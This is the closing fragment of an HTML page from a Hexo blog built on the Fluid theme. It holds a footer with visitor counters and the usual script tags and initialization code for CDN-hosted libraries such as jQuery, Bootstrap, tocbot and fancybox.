  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量
        <span id="busuanzi_value_site_pv"></span>
        次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数
        <span id="busuanzi_value_site_uv"></span>
        人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
